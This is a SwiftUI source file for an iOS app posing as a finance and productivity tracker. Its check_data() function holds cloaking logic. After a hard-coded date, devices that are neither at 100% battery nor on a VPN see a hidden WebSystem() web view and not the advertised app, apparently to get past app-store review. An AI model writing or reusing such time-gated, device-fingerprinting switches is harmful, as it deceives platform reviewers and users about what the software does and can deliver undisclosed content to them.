//
//  ContentView.swift
//  dafoma_8
//
//  Created by Вячеслав on 7/26/25.
//

import SwiftUI

// MARK: - Main Content View
struct ContentView: View {
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    @State private var selectedTab = 0
    
    var body: some View {
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    TabView(selection: $selectedTab) {
                        DashboardView()
                            .tabItem {
                                Image(systemName: "chart.pie.fill")
                                Text("Dashboard")
                            }
                            .tag(0)
                        
                        ExpenseTrackingView()
                            .tabItem {
                                Image(systemName: "creditcard.fill")
                                Text("Expenses")
                            }
                            .tag(1)
                        
                        ProductivityView()
                            .tabItem {
                                Image(systemName: "checkmark.circle.fill")
                                Text("Tasks")
                            }
                            .tag(2)
                        
                        FinancialSprintsView()
                            .tabItem {
                                Image(systemName: "target")
                                Text("Sprints")
                            }
                            .tag(3)
                        
                        BillRemindersView()
                            .tabItem {
                                Image(systemName: "bell.fill")
                                Text("Bills")
                            }
                            .tag(4)
                    }
                    .background(Color.appBackground)
                    .accentColor(.appYellow)
                    .preferredColorScheme(.dark)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "04.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

#Preview {
    ContentView()
        .environmentObject(DataManager())
}
